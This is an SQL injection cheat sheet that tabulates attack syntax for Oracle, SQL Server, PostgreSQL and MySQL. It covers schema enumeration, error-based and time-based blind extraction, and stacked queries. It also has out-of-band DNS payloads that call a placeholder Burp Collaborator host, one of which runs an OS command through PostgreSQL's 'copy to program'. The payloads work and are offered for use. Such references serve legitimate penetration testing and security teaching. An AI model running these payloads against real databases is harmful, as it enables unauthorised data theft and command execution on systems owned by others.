# SQL Injection Cheat Sheet

This SQL injection cheat sheet contains examples of useful syntax for performing various SQL injection attacks.

## String Concatenation
Concatenate multiple strings into a single string.

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `'foo'||'bar'`                 |
| Microsoft  | `'foo'+'bar'`                  |
| PostgreSQL | `'foo'||'bar'`                 |
| MySQL      | `'foo' 'bar'` (space between)  |
|            | `CONCAT('foo','bar')`          |

## Substring
Extract part of a string (returns 'ba' from 'foobar').

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `SUBSTR('foobar', 4, 2)`       |
| Microsoft  | `SUBSTRING('foobar', 4, 2)`    |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)`    |
| MySQL      | `SUBSTRING('foobar', 4, 2)`    |

## Comments
Truncate queries using comments.

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `--comment`                    |
| Microsoft  | `--comment` or `/*comment*/`   |
| PostgreSQL | `--comment` or `/*comment*/`   |
| MySQL      | `#comment`                     |
|            | `-- comment` (space after --)  |
|            | `/*comment*/`                  |

## Database Version
Query database type and version.

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`             |
| PostgreSQL | `SELECT version()`             |
| MySQL      | `SELECT @@version`             |

## Database Contents
List tables and columns.

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft  | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | Same as Microsoft              |
| MySQL      | Same as Microsoft              |

## Conditional Errors
Trigger errors based on conditions.

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## Time Delays
Cause unconditional time delays (10 seconds).

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`       |
| PostgreSQL | `SELECT pg_sleep(10)`          |
| MySQL      | `SELECT SLEEP(10)`             |

## Conditional Time Delays
Trigger delays based on conditions.

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

## DNS Lookup
Trigger external DNS lookups (requires Burp Collaborator).

| Database   | Syntax                          |
|------------|---------------------------------|
| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL      | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` (Windows only) |

## Batched Queries
Execute multiple queries (stacked queries).

| Database   | Support                         |
|------------|---------------------------------|
| Oracle     | Not supported                   |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`    |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`    |
| MySQL      | Limited support (depends on API) |
